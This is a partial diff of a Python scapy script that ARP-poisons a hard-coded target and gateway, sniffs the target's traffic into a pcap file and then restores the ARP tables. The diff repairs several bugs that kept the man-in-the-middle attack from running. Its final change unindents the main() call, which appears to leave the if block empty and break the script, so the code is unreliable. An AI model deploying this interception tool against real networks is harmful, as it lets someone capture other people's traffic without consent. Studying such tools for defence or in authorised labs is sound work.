@@ -1,10 +1,10 @@
 from scapy.all import *
 import os
 import sys
-import threadind
+import threading
 import signal
 
-interface = "en1"
+interface = "eth0"
 target_ip = "192.168.1.105"
 gateway_ip = "192.168.1.1"
 packet_count = 1000
@@ -68,13 +68,13 @@ def main():
     else:
         print "[*] Target %s is at %s" % (target_ip, target_mac)
 
-    poison_thread = threading.Thread(target = poison_thread, args=(gateway_ip, gateway_mac, target_ip, target_mac))
+    poison_thread = threading.Thread(target = poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
     poison_thread.start()
 
     try:
         print "[*] Starting sniffer for %d packets" % packet_count
         bpf_filter = "ip host %s" % target_ip
-        packets = sniff(packet_count=packet_count, filter=bpf_filter, iface=interface)
+        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
         wrpcap('arprt.pcap', packets)
         restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
     except KeyboardInterrupt:
@@ -82,4 +82,4 @@ def main():
         sys.exit(0)
 
 if __name__ == '__main__':
-    main()
+main()
